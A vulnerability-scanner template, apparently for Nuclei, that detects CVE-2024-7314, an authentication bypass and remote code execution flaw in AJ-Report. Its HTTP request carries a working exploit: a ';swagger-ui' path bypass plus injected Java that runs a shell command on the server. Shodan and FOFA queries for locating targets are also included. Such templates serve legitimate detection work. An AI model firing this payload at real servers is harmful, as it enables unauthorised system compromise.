http:
- extractors:
  - regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  matchers:
  - condition: and
    part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    - 'data":'
    type: regex
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /dataSetParam/verification;swagger-ui/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json;charset=UTF-8


    {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function
    verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new
    java.io.BufferedReader(new java.io.InputStreamReader(a));ss='''';while((line =
    r.readLine()) != null){ss+=line};return ss;}"}

    '
id: CVE-2024-7314
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:anji-plus:report:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-7314
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-280
    epss-percentile: 0.98609
    epss-score: 0.70102
  description: 'AJ-Report before version 1.4.1 is affected by an authentication bypass
    vulnerability. A remote and unauthenticated attacker can append ";swagger-ui"
    to HTTP requests to bypass authentication and execute arbitrary Java code on the
    victim server through script engine injection in the validation rules functionality.

    '
  impact: 'Unauthenticated attackers can bypass authentication and execute arbitrary
    Java code on the server through script engine injection, achieving complete system
    compromise and access to all application data.

    '
  metadata:
    fofa-query: app="AJ-Report"
    max-request: 1
    product: report
    shodan-query: http.title:"AJ-Report"
    vendor: anji-plus
    verified: true
  name: AJ-Report < 1.4.1 - Remote Code Execution
  reference:
  - https://github.com/vulhub/vulhub/tree/master/aj-report/CNVD-2024-15077
  - https://github.com/yuebusao/AJ-REPORT-EXPLOIT
  - https://xz.aliyun.com/t/14460
  - https://nvd.nist.gov/vuln/detail/CVE-2024-7314
  remediation: 'Upgrade to AJ-Report version 1.4.1 or later which includes security
    fixes.

    '
  severity: critical
  tags: cve,cve2024,aj-report,anji-plus,rce,swagger,vkev,vuln
